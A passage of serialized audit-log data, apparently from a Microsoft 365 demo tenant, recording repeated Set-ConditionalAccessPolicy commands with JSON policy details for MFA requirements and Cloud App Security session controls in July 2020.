'{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/13/2020 5:38:30 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/13/2020 5:38:30 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '7/13/2020 5:38:31 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/14/2020 2:31:27 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/14/2020 2:31:27 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/14/2020 5:26:43 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/14/2020 5:26:43 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/15/2020 2:50:27 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/15/2020 2:50:29 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/15/2020 5:27:44 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\4c5a5ea0-5d9f-4730-baaa-7a69cf29ef26', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/15/2020 5:27:43 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Semolen - Admin MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\4c5a5ea0-5d9f-4730-baaa-7a69cf29ef26', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/16/2020 2:31:10 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Semolen - Admin MFA', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/16/2020 2:31:10 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/16/2020 5:00:45 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/16/2020 5:00:45 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '7/16/2020 5:00:49 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/16/2020 5:00:46 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/17/2020 1:59:50 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/17/2020 1:59:51 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/17/2020 5:00:48 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/17/2020 5:00:48 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/17/2020 5:00:48 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '7/17/2020 5:00:49 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/18/2020 5:22:18 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/18/2020 5:22:16 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': 